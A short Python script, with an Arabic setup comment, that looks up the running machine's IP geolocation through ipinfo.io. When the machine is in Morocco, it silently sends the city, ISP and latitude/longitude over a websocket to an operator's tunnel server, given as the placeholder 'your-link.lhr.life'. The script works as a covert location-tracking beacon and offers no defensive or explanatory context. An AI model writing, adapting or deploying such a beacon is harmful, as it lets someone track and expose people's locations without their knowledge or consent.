import requests
import json
import asyncio
import websockets

# استبدل هذا بالرابط الذي سيظهر لك في الشاشة
SERVER_URL = "https://your-link.lhr.life" 
SERVER_WS = SERVER_URL.replace("https", "ws")

def get_ip_info():
   r = requests.get("https://ipinfo.io/json", timeout=5)
   return r.json()

async def send(datainfo):
    async with websockets.connect(SERVER_WS) as ws:
        await ws.send(json.dumps(datainfo))

def main():
    info = get_ip_info()
    if info.get("country") != "MA": return
    
    lat, lon = map(float, info["loc"].split(","))
    datainfo = {
        "country": "MA",
        "city": info.get("city"),
        "org": info.get("org"),
        "lat": lat,
        "lon": lon
    }
    try:
        asyncio.run(send(datainfo))
        print("[+] Sended via Webview Link!")
    except: print("[-] Failed")

if __name__ == "__main__":
    main()
